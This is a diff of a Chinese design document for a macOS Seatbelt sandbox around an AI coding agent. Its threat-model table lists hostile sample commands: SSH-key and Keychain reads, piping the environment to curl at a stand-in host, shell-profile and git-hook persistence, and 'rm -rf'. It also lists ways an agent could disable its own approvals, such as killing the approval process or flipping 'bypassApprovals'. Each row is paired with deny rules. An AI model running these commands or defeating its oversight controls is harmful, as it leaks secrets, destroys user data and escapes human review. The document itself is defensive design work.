@@ -24,11 +24,13 @@
 | # | 威胁 | 真实攻击样例 | 遏制点（Seatbelt 操作 + 插件） | 残余风险 |
 |---|---|---|---|---|
 | **T1** | **凭据外泄** | `cat ~/.ssh/id_ed25519`、`security find-generic-password -w`、`cat .env`、`env \| curl -d @- x` | `(deny file-read* (subpath "~/.ssh") (subpath "~/.aws") (subpath "~/.config/gh") (subpath "~/.docker"))`（`sandbox-guards` 提供集合，`sandbox-macos` 编译）；`(deny process-exec (literal "/usr/bin/security"))` 掐 Keychain CLI 通道（附录 F：A15 实测 `deny mach-lookup` 不可用）；`tool-bash` 已有 `SECRET_ENV` 环境清洗 | 命令行参数里的密钥会进 `ps`；剪贴板（`pbcopy`）需 `(deny pasteboard-*)` ⚠️ |
-| **T2** | **供应链式持久化**：改配置让下次会话继续执行 | `echo cmd >> ~/.zshrc`、`cat > .git/hooks/pre-commit`、`git config core.hooksPath /tmp/x`、写 `~/Library/LaunchAgents/evil.plist`、`crontab` | `(deny file-write* (subpath "<ws>/.git") (subpath "<home>/.zshrc") (subpath "<home>/Library/LaunchAgents") (subpath "<home>/Library/Application Support"))`；`.env` 变体按 `regex` 拒绝；与 T4 共用同一张 `PathGuard` 表 | 仓库外的持久化点（npm 全局目录等）只要在 write 根白名单外就进不来；`.git/config` 修改被 `.git` 只读覆盖拦住 |
+| **T2** | **供应链式持久化**：改配置让下次会话继续执行 | `echo cmd >> ~/.zshrc`、`cat > .git/hooks/pre-commit`、`git config core.hooksPath /tmp/x`、写 `~/Library/LaunchAgents/evil.plist`、`crontab` | `(deny file-write* ...)` 覆盖 git 的持久化点（`.git/hooks`、`.git/config`、`objects/info/alternates`、`info/attributes`、子模块 hooks/config）、`~/.zshrc`、LaunchAgents、托管策略目录；`.env` 变体按 `regex` 拒绝；与 T4 共用同一张 `PathGuard` 表 | `index`、`objects`、`refs`、`logs` 等普通 git 数据**可写**（否则 `git add/commit` 无法工作）；写这些不能跨会话执行。`.git/hooks` 与 `.git/config` 仍只读 |
 | **T3** | **横向移动**：把沙箱当跳板打本机服务 | `curl http://127.0.0.1:4310/api/...`（harness 自己的 API + 若 `RBU_TOKEN` 泄漏）、`curl --unix-socket /var/run/docker.sock`、打 Ollama / dev server / 本地 DB | `net.mode='deny'` → `(deny network*)`；回环同样落在 `network-outbound` 里被拒（实测 `remote:*:80`）；Unix socket 同时受 `network*` 与 `file-write-data` 约束 | 一旦某次审批放开了回环端口，agent 可反打 harness。§3.3 因此规定**回环永不放宽** |
-| **T4** | **越界写 / 删** | `rm -rf ~/Documents`、`echo x > /etc/hosts`、`ln -s ~/.ssh/x <ws>/x` 再写、`mv .git /tmp` | write 根白名单只有 `<ws>` 与 `TMPDIR`；`(deny file-write* ...)` 覆盖 `.git`；Seatbelt 按 **vnode** 判定（实测软链指向 `/etc/hosts` 照样被拦），symlink 借不到权限 | 进程内守卫（`tool-fs`）靠字符串比较：APFS 大小写不敏感 + Unicode NFD 会绕过 `path.relative` → 必须 `realpath` + NFC + 大小写折叠（§5.1） |
+| **T4** | **越界写 / 删** | `rm -rf ~/Documents`、`echo x > /etc/hosts`、`ln -s ~/.ssh/x <ws>/x` 再写、`mv .git /tmp` | write 根白名单只有 `<ws>` 与 `TMPDIR`；git 持久化点另有 `(deny file-write*)`；Seatbelt 按 **vnode** 判定（实测软链指向 `/etc/hosts` 照样被拦），symlink 借不到权限 | 进程内守卫（`tool-fs`）靠字符串比较：APFS 大小写不敏感 + Unicode NFD 会绕过 `path.relative` → 必须 `realpath` + NFC + 大小写折叠（§5.1） |
 | **T5** | **控制平面降级**：不突破，而是让防线失效 | `osascript -e 'tell app "Terminal" to do script ...'`、`kill` 掉审批进程、把 `.ruobai/settings.json` 的 `bypassApprovals` 改 true | `(deny appleevent-send)`、`(deny signal (target others))`、`(deny process-info*)`；escalation 类审批**不受 `bypassApprovals` 影响**（§3.6）；`.ruobai/` 默认进 guardWrite | 若 `.ruobai/` 落在 write 根内且未加守卫，agent 可改自己的审批配置——所以默认加守卫是安全必需，不是可选项 |
 | **T6**（元） | **归因缺失**：分不清"命令自己失败"与"沙箱拒绝" | agent 见 `Operation not permitted` 后重试 10 次，或把沙箱拒绝误读成"文件不存在"去换路径 | `sandbox-denial` + `sandbox-native-log`：从统一日志取 `deny(1) <operation> <target>`，产出 `DenialKind` + `confidence`；工具结果永远带结构化 `denials[]` | 日志有 1–2s 延迟且是全系统广播，必须按 pid 过滤（实测日志里混有 `logd_helper`、`ecosystemd` 的拒绝） |
+
+**git worktree**：会话根是 linked worktree 时，`.git` 是文件。策略启动时解析它（`gitdir:` 与 `commondir`），把 worktree 的 git dir 与公共 git dir 都加入写授权；持久化守卫（hooks/config/alternates）落在公共目录，`.git` 指针文件本身只读。实测：worktree 内 `git add/commit` 通过，写 `.git/hooks` 仍被拒。
 
 **非目标**（写进 README，避免"沙箱"被当成安全承诺）：防 0day 提权、防内核漏洞、防用户主动批准的危险操作、多租户隔离。
 
@@ -336,7 +338,7 @@ export type Exemption =
 
 - `network`：不许通过 exemption 放宽成 `network*`；要联网必须走独立"网络授权"流程（生成 `(allow network-outbound (remote ip "host:port"))` 写进本会话策略），且**回环与链路本地地址永不授权**。
 - `process-exec`：不许放宽成"任意可执行"，只能逐个可执行文件加进 `exec.allowPaths`。
-- 任何豁免都不能把 `.git`、`.ssh`、`.ruobai/` 从只读变可写。
+- 任何豁免都不能把 git 持久化点（hooks、config、alternates、info/attributes）、`.ssh`、`.ruobai/` 从只读变可写。
 
 ### 3.4 规则引擎作为插件注册
 
